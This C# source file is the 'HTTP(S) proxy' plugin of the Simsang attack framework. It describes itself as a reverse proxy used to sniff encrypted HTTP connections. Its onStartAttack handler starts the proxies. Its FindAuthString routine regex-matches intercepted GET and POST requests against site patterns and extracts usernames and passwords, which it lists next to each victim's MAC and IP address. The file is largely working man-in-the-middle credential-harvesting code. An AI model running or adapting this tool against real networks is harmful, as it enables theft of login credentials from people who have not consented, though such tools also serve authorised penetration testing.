using System;
using System.IO;
using System.Collections.Generic;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Web;
using System.Windows.Forms;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Configuration;

using Simsang.Plugin;
using Plugin.Main.HTTPProxy;
using ManageAuthentications = Plugin.Main.HTTPProxy.ManageAuthentications;
using Plugin.Main.HTTPProxy.Config;

namespace Plugin.Main
{

  #region DATATYPES
  /// <summary>
  /// 
  /// </summary>
  public struct sHTTPAccount
  {
    public String Username;
    public String Password;
    public String Company;
    public String CompanyURL;
  }

  [Serializable]
  public struct PluginData
  {
    public String RemoteHost;
    public String RedirectURL;
    public List<Account> Records;
  }

  public class PeerSystems
  {
    public String Name { get; set; }
    public String Value { get; set; }
  }

  #endregion


  public partial class PluginHTTPProxyUC : UserControl, IPlugin, IObserver
  {

    #region MEMBERS

    private List<String> cTargetList;
    private List<PeerSystems> cPeersDataSource;
    private BindingList<Account> cAccounts;
    public List<ManageAuthentications.AccountPattern> cAccountPatterns;
    private TaskFacade cTask;
    private PluginParameters cPluginParams;

    #endregion


    #region PUBLIC

    public PluginHTTPProxyUC(PluginParameters pPluginParams)
    {
      InitializeComponent();

      #region DATAGRID HEADER

      DGV_Accounts.AutoGenerateColumns = false;

      DataGridViewTextBoxColumn cMACCol = new DataGridViewTextBoxColumn();
      cMACCol.DataPropertyName = "SrcMAC";
      cMACCol.Name = "SrcMAC";
      cMACCol.HeaderText = "MAC address";
      cMACCol.ReadOnly = true;
      cMACCol.Width = 120;
      //cMACCol.Visible = false;
      DGV_Accounts.Columns.Add(cMACCol);


      DataGridViewTextBoxColumn cSrcIPCol = new DataGridViewTextBoxColumn();
      cSrcIPCol.DataPropertyName = "SrcIP";
      cSrcIPCol.Name = "SrcIP";
      cSrcIPCol.HeaderText = "Source IP";
      cSrcIPCol.Visible = false;
      cSrcIPCol.ReadOnly = true;
      cSrcIPCol.Width = 120;
      DGV_Accounts.Columns.Add(cSrcIPCol);


      DataGridViewTextBoxColumn cDstIPCol = new DataGridViewTextBoxColumn();
      cDstIPCol.DataPropertyName = "DstIP";
      cDstIPCol.Name = "DstIP";
      cDstIPCol.HeaderText = "Destination";
      cDstIPCol.ReadOnly = true;
      cDstIPCol.Width = 200;
      DGV_Accounts.Columns.Add(cDstIPCol);

      DataGridViewTextBoxColumn cDestPortCol = new DataGridViewTextBoxColumn();
      cDestPortCol.DataPropertyName = "DstPort";
      cDestPortCol.Name = "DstPort";
      cDestPortCol.HeaderText = "Service";
      cDestPortCol.ReadOnly = true;
      cDestPortCol.Width = 60;
      DGV_Accounts.Columns.Add(cDestPortCol);


      DataGridViewTextBoxColumn cUserCol = new DataGridViewTextBoxColumn();
      cUserCol.DataPropertyName = "Username";
      cUserCol.Name = "Username";
      cUserCol.HeaderText = "Username";
      cUserCol.ReadOnly = true;
      cUserCol.Width = 150;
      DGV_Accounts.Columns.Add(cUserCol);


      DataGridViewTextBoxColumn cmPassCol = new DataGridViewTextBoxColumn();
      cmPassCol.DataPropertyName = "Password";
      cmPassCol.Name = "Password";
      cmPassCol.HeaderText = "Password";
      cmPassCol.ReadOnly = true;
      //            cmPassCol.Width = 120;
      cmPassCol.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
      DGV_Accounts.Columns.Add(cmPassCol);


      cAccounts = new BindingList<Account>();
      DGV_Accounts.DataSource = cAccounts;
      #endregion

      /*
       * Plugin configuration
       */
      cPluginParams = pPluginParams;
      String lBaseDir = String.Format(@"{0}\", (pPluginParams != null) ? pPluginParams.PluginDirectoryFullPath : Directory.GetCurrentDirectory());
      String lSessionDir = (pPluginParams != null) ? pPluginParams.SessionDirectoryFullPath : String.Format("{0}sessions", lBaseDir);

      cPeersDataSource = new List<PeerSystems>();
      cAccountPatterns = new List<ManageAuthentications.AccountPattern>();

      Config = new PluginProperties()
      {
        BaseDir = lBaseDir,
        SessionDir = lSessionDir,
        PluginName = "HTTP(S) proxy",
        PluginDescription = "HTTP and HTTPS reverse proxy server to sniff on (encrypted) HTTP connections.",
        PluginVersion = "0.7",
        Ports = "TCP:80;TCP:443;",
        IsActive = true
      };


      WebServerConfig lWebServerConfig = new WebServerConfig();
      lWebServerConfig.BasisDirectory = Config.BaseDir;

      cTask = TaskFacade.getInstance(lWebServerConfig, this);
      DomainFacade.getInstance(lWebServerConfig, this).addObserver(this);
    }

    #endregion


    #region PROPERTIES

    public Control PluginControl { get { return (this); } }

    #endregion


    #region IPlugin Member

    /// <summary>
    /// 
    /// </summary>
    public PluginProperties Config { set; get; }


    /// <summary>
    /// 
    /// </summary>
    public delegate void onInitDelegate();
    public void onInit()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onInitDelegate(onInit), new object[] { });
        return;
      } // if (InvokeRequired)

      cPluginParams.HostApplication.Register(this);
      setGUIActive();
      cPluginParams.HostApplication.PluginSetStatus(this, "grey");

      WebServerConfig lWebServerConfig = new WebServerConfig();
      lWebServerConfig.BasisDirectory = Config.BaseDir;
      lWebServerConfig.isDebuggingOn = false;
      lWebServerConfig.isRedirect = false;
      lWebServerConfig.RedirectToURL = String.Empty;
      lWebServerConfig.RemoteHostName = String.Empty;
      lWebServerConfig.onWebServerExit = onWebServerExited;

      cTask.onInit(lWebServerConfig);
      cAccountPatterns = cTask.readAuthenticationPatterns();
    }


    /// <summary>
    /// 
    /// </summary>
    public delegate void onStartAttackDelegate();
    public void onStartAttack()
    {
      if (Config.IsActive)
      {
        if (InvokeRequired)
        {
          BeginInvoke(new onStartAttackDelegate(onStartAttack), new object[] { });
          return;
        } // if (InvokeRequired)

        cPluginParams.HostApplication.PluginSetStatus(this, "green");
        setGUIInactive();


        if ((!CB_RedirectTo.Checked && !String.IsNullOrEmpty(TB_RemoteHost.Text)) ||
            (CB_RedirectTo.Checked && !String.IsNullOrEmpty(TB_RedirectURL.Text)))
        {
          WebServerConfig pConfig = new WebServerConfig
          {
            BasisDirectory = Config.BaseDir,
            isDebuggingOn = cPluginParams.HostApplication.IsDebuggingOn(),
            isRedirect = CB_RedirectTo.Checked,
            RedirectToURL = TB_RedirectURL.Text,
            RemoteHostName = TB_RemoteHost.Text,
            onWebServerExit = onWebServerExited
          };


          try
          {
            cTask.startProxies(pConfig);
          }
          catch (Exception lEx)
          {
            String lLogMsg = String.Format("{0}: {1}", Config.PluginName, lEx.Message);
            setGUIActive();
            cPluginParams.HostApplication.LogMessage(lLogMsg);
            cPluginParams.HostApplication.PluginSetStatus(this, "red");

            cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
            cTask.onStop();
          }
        }
        else
        {
          cPluginParams.HostApplication.LogMessage(String.Format("{0}: No forwarding host/URL defined. Stopping the pluggin.", Config.PluginName));
          cPluginParams.HostApplication.PluginSetStatus(this, "grey");
          cTask.onStop();
        }  // if (lRemoteHost ...

      } // if (cIsActiv...
    }



    /// <summary>
    /// 
    /// </summary>
    public delegate void onStopAttackDelegate();
    public void onStopAttack()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onStopAttackDelegate(onStopAttack), new object[] { });
        return;
      } // if (InvokeRequired)

      setGUIActive();
      cTask.onStop();
      cPluginParams.HostApplication.PluginSetStatus(this, "grey");
    }



    /// <summary>
    /// 
    /// </summary>
    /// <returns></returns>
    public delegate String getDataDelegate();
    public String getData()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new getDataDelegate(getData), new object[] { });
        return (String.Empty);
      } // if (InvokeRequired)


      return (String.Empty);
    }

    #endregion


    #region SESSION


    /// <summary>
    /// 
    /// </summary>
    /// <param name="pSessionID"></param>
    /// <returns></returns>
    public delegate String onGetSessionDataDelegate(String pSessionID);
    public String onGetSessionData(String pSessionID)
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onGetSessionDataDelegate(onGetSessionData), new object[] { pSessionID });
        return (String.Empty);
      } // if (InvokeRequired)

      String lRetVal = String.Empty;

      try
      {
        lRetVal = cTask.getSessionData(pSessionID);
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
      }

      return (lRetVal);
    }


    /// <summary>
    /// 
    /// </summary>
    public delegate void onShutDownDelegate();
    public void onShutDown()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onShutDownDelegate(onShutDown), new object[] { });
        return;
      } // if (Invoke

      cTask.onStop();
    }



    /// <summary>
    /// 
    /// </summary>
    /// <param name="pSessionName"></param>
    public delegate void onLoadSessionDataFromFileDelegate(String pSessionName);
    public void onLoadSessionDataFromFile(String pSessionName)
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onLoadSessionDataFromFileDelegate(onLoadSessionDataFromFile), new object[] { pSessionName });
        return;
      } // if (InvokeRequired)


      try
      {
        onResetPlugin();
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
      }

      try
      {
        cTask.loadSessionData(pSessionName);
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
      }
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="pSessionData"></param>
    public delegate void onLoadSessionDataFromStringDelegate(String pSessionData);
    public void onLoadSessionDataFromString(String pSessionData)
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onLoadSessionDataFromStringDelegate(onLoadSessionDataFromString), new object[] { pSessionData });
        return;
      } // if (InvokeRequired)

      cTask.loadSessionDataFromString(pSessionData);
    }


    /// <summary>
    /// 
    /// </summary>
    public delegate void onResetPluginDelegate();
    public void onResetPlugin()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onResetPluginDelegate(onResetPlugin), new object[] { });
        return;
      } // if (InvokeRequired)

      cTask.clearRecordList();
      TB_RemoteHost.Text = String.Empty;
      setGUIActive();
      cPluginParams.HostApplication.PluginSetStatus(this, "grey");
    }




    /// <summary>
    /// 
    /// </summary>
    /// <param name="pSessionFileName"></param>
    public delegate void onDeleteSessionDataDelegate(String pSessionName);
    public void onDeleteSessionData(String pSessionName)
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onDeleteSessionDataDelegate(onDeleteSessionData), new object[] { pSessionName });
        return;
      } // if (InvokeRequired)

      try
      {
        cTask.deleteSession(pSessionName);
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
      }
    }





    /// <summary>
    /// 
    /// </summary>
    /// <param name="pSessionName"></param>
    public delegate void onSaveSessionDataDelegate(String pSessionName);
    public void onSaveSessionData(String pSessionName)
    {
      if (Config.IsActive)
      {
        if (InvokeRequired)
        {
          BeginInvoke(new onSaveSessionDataDelegate(onSaveSessionData), new object[] { pSessionName });
          return;
        } // if (InvokeRequired)

        try
        {
          String pRemoteHost = TB_RemoteHost.Text;
          String pRedirectURL = TB_RedirectURL.Text;

          cTask.saveSession(pSessionName, pRemoteHost, pRedirectURL);
        }
        catch (Exception lEx)
        {
          cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
        }
      } // if (cIsActiv...
    }



    /// <summary>
    /// New input data arrived (Not relevant in this plugin)
    /// </summary>
    /// <param name="pData"></param>
    public delegate void onNewDataDelegate(String pData);
    public void onNewData(String pData)
    {
      if (Config.IsActive)
      {
        if (InvokeRequired)
        {
          BeginInvoke(new onNewDataDelegate(onNewData), new object[] { pData });
          return;
        } // if (InvokeRequired)


        try
        {
          if (pData != null && pData.Length > 0)
          {
            String[] lSplitter = Regex.Split(pData, @"\|\|");
            if (lSplitter.Length == 7)
            {
              String lProto = lSplitter[0];
              String lSMAC = lSplitter[1];
              String lSIP = lSplitter[2];
              String lSPort = lSplitter[3];
              String lDIP = lSplitter[4];
              String lDPort = lSplitter[5];
              String lData = lSplitter[6];


              /*
               * HTML GET authentication strings
               */
              sHTTPAccount lAuthData = new sHTTPAccount();

              try
              {
                lAuthData = FindAuthString(lData);
              }
              catch (Exception lEx)
              {
                cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
                return;
              }

              if (lAuthData.CompanyURL.Length > 0 &&
                  lAuthData.Username.Length > 0 &&
                  lAuthData.Password.Length > 0)
              {
                cTask.addRecord(new Account(lSMAC, lSIP, lAuthData.CompanyURL, lDPort, lAuthData.Username, lAuthData.Password));                
              } // if (lAuthData.Co...
            } // if (lSplitter...
          } // if (pData.Lengt ...
        }
        catch (Exception lEx)
        {
          cPluginParams.HostApplication.LogMessage(String.Format("{0} : {1}", Config.PluginName, lEx.Message));
        }
      } // if (cIsActiv...
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="pTargetList"></param>
    public void SetTargets(List<String> pTargetList)
    {
      cTargetList = pTargetList;
    }


    #endregion


    #region PRIVATE

    /// <summary>
    /// 
    /// </summary>
    private delegate void setGUIInactiveDelegate();
    private void setGUIInactive()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new setGUIInactiveDelegate(setGUIInactive), new object[] { });
        return;
      }

      TB_RemoteHost.Enabled = false;
      CB_RedirectTo.Enabled = false;
      TB_RedirectURL.Enabled = false;
    }



    /// <summary>
    /// 
    /// </summary>
    private delegate void setGUIActiveDelegate();
    private void setGUIActive()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new setGUIActiveDelegate(setGUIActive), new object[] { });
        return;
      }

      /*
       * Adjust GUI parameters
       */
      TB_RemoteHost.Enabled = true;
      CB_RedirectTo.Enabled = true;

      if (CB_RedirectTo.Checked)
      {
        TB_RedirectURL.Enabled = true;
        TB_RemoteHost.Enabled = false;
      }
      else
      {
        TB_RedirectURL.Enabled = false;
        TB_RemoteHost.Enabled = true;
      }
    }



    /// <summary>
    /// Poisoning exited.
    /// </summary>
    private void onWebServerExited()
    {
      if (InvokeRequired)
      {
        BeginInvoke(new onWebServerExitedDelegate(onWebServerExited), new object[] { });
        return;
      } // if (InvokeRequired)

      cPluginParams.HostApplication.PluginSetStatus(this, "red");
      cPluginParams.HostApplication.LogMessage(String.Format("{0}: Stopped for unknown reason", Config.PluginName));
      setGUIActive();
    }


    /// <summary>
    /// Find authentication pattern
    /// </summary>
    /// <param name="pHTTPData"></param>
    /// <returns></returns>
    private sHTTPAccount FindAuthString(String pHTTPData)
    {
      sHTTPAccount lRetVal;

      lRetVal.Username = String.Empty;
      lRetVal.Password = String.Empty;
      lRetVal.Company = String.Empty;
      lRetVal.CompanyURL = String.Empty;


      if (cAccountPatterns != null && cAccountPatterns.Count > 0)
      {
        Match lMatchHost;
        Match lMatchMethod;
        Match lMatchURI;
        Match lMatchCreds;
        String lReqHost = String.Empty;
        String lReqMethod = String.Empty;
        String lReqURI = String.Empty;
        String lHTTPData = HttpUtility.UrlDecode(pHTTPData);
        String lUsername = String.Empty;
        String lPassword = String.Empty;

        foreach (ManageAuthentications.AccountPattern lTmpAccount in cAccountPatterns)
        {
          if ((lMatchMethod = Regex.Match(lHTTPData, @"\s*(GET|POST)\s+")).Success &&
              (lMatchURI = Regex.Match(lHTTPData, @"\s*(GET|POST)\s+([^\s]+)\s+", RegexOptions.IgnoreCase)).Success &&
              (lMatchHost = Regex.Match(lHTTPData, @"\.\.Host\s*:\s*([\w\d\.]+?)\.\.", RegexOptions.IgnoreCase)).Success &&
              (lMatchCreds = Regex.Match(lHTTPData, @lTmpAccount.DataPattern)).Success
             )
          {
            lReqMethod = lMatchMethod.Groups[1].Value.ToString();
            lReqURI = lMatchURI.Groups[2].Value.ToString();
            lReqHost = lMatchHost.Groups[1].Value.ToString();
            lUsername = lMatchCreds.Groups[1].Value.ToString();
            lPassword = lMatchCreds.Groups[2].Value.ToString();


            if (@lTmpAccount.Method == lReqMethod &&
                Regex.Match(lReqHost, @lTmpAccount.Host).Success &&
                Regex.Match(lReqURI, @lTmpAccount.Path).Success &&
                Regex.Match(lHTTPData, @lTmpAccount.DataPattern).Success)
            {
              lRetVal.Company = @lTmpAccount.Company;
              lRetVal.CompanyURL = @lTmpAccount.WebPage + "   (http://" + lReqHost + lReqURI + ")";
              lRetVal.Username = lUsername;
              lRetVal.Password = lPassword;

              break;
            } // if (lMethod ...
          } // if ((lMatchMet...
        }
      }
      /*
        foreach (String lAuthPattern in mHTMLAuthPatterns)
        {
            String[] lSplit = Regex.Split(lAuthPattern, @"\|\|");


            if (lSplit.Length == 6)
            {
              String lMethod = lSplit[0];
              String lHostPattern = lSplit[1];
              String lURIPattern = lSplit[2];
              String lCredentialsPattern = lSplit[3];
              String lCompany = lSplit[4];
              String lCompanyURL = lSplit[5];
              Match lMatchHost;
              Match lMatchMethod;
              Match lMatchURI;
              Match lMatchCreds;
              String lReqHost;
              String lReqMethod;
              String lReqURI;
              String lHTTPData = HttpUtility.UrlDecode(pHTTPData);
              String lUsername = String.Empty;
              String lPassword = String.Empty;

                
                if ((lMatchMethod = Regex.Match(lHTTPData, @"\s*(GET|POST)\s+")).Success &&
                    (lMatchURI = Regex.Match(lHTTPData, @"\s*(GET|POST)\s+([^\s]+)\s+", RegexOptions.IgnoreCase)).Success &&
                    (lMatchHost = Regex.Match(lHTTPData, @"\.\.Host\s*:\s*([\w\d\.]+?)\.\.", RegexOptions.IgnoreCase)).Success &&
                    (lMatchCreds = Regex.Match(lHTTPData, @lCredentialsPattern)).Success
                   )
                {
                    lReqMethod = lMatchMethod.Groups[1].Value.ToString();
                    lReqURI = lMatchURI.Groups[2].Value.ToString();
                    lReqHost = lMatchHost.Groups[1].Value.ToString();
                    lUsername = lMatchCreds.Groups[1].Value.ToString();
                    lPassword = lMatchCreds.Groups[2].Value.ToString();


                    if (lMethod == lReqMethod &&
                        Regex.Match(lReqHost, @lHostPattern).Success &&
                        Regex.Match(lReqURI, @lURIPattern).Success &&
                        Regex.Match(lHTTPData, @lCredentialsPattern).Success)
                    {
                        lRetVal.Company = lCompany;
                        lRetVal.CompanyURL = lCompanyURL + "   (http://" + lReqHost + lReqURI + ")";
                        lRetVal.Username = lUsername;
                        lRetVal.Password = lPassword;

                        break;
                    } // if (lMethod ...
                } // if ((lMatchMet...
            } // if (lSplit.Leng...
        } // foreach (String lAuthP...
*/
      return (lRetVal);
    }

    #endregion


    #region EVENTS

    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void DGV_Accounts_MouseUp(object sender, MouseEventArgs e)
    {
      if (e.Button == MouseButtons.Right)
      {
        try
        {
          DataGridView.HitTestInfo hti = DGV_Accounts.HitTest(e.X, e.Y);
          if (hti.RowIndex >= 0)
            CMS_PasswordProxy.Show(DGV_Accounts, e.Location);
        }
        catch (Exception lEx)
        {
          cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
        }
      } // if (e.Button ...
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void TSMI_Clear_Click(object sender, EventArgs e)
    {
      cTask.clearRecordList();
    }

    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void DGV_Accounts_CellContentClick(object sender, DataGridViewCellEventArgs e)
    {
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void deleteEntryToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        int lCurIndex = DGV_Accounts.CurrentCell.RowIndex;
        cTask.removeRecordAt(lCurIndex);
      }
      catch (Exception lEx)
      {
        cPluginParams.HostApplication.LogMessage(String.Format("{0}: {1}", Config.PluginName, lEx.Message));
      }
    }



    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void DGV_Accounts_DoubleClick(object sender, EventArgs e)
    {
      ManageAuthentications.Form_ManageAuthentications lManageSystems = new ManageAuthentications.Form_ManageAuthentications(cPluginParams.HostApplication);
      lManageSystems.ShowDialog();
      cAccountPatterns = cTask.readAuthenticationPatterns();
    }


    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    private void CB_RedirectTo_CheckedChanged(object sender, EventArgs e)
    {
      if (CB_RedirectTo.Checked)
      {
        TB_RedirectURL.Enabled = true;
        TB_RemoteHost.Enabled = false;
      }
      else
      {
        TB_RedirectURL.Enabled = false;
        TB_RemoteHost.Enabled = true;
      }
    }

    #endregion


    #region OBSERVER INTERFACE METHODS

    public void updateRecords(List<Account> pHostnameIPPair)
    {
      cAccounts.Clear();
      foreach (Account lTmp in pHostnameIPPair)
        cAccounts.Add(new Account(lTmp.SrcMAC, lTmp.SrcIP, lTmp.DstIP, lTmp.DstPort, lTmp.Username, lTmp.Password));

      DGV_Accounts.Refresh();
    }

    public void updateRedirectURL(String pRedirectURL)
    {
      TB_RedirectURL.Text = pRedirectURL;
    }

    public void updateRemoteHostName(String pRemoteHostName)
    {
      TB_RemoteHost.Text = pRemoteHostName;
    }


    #endregion

  }
}
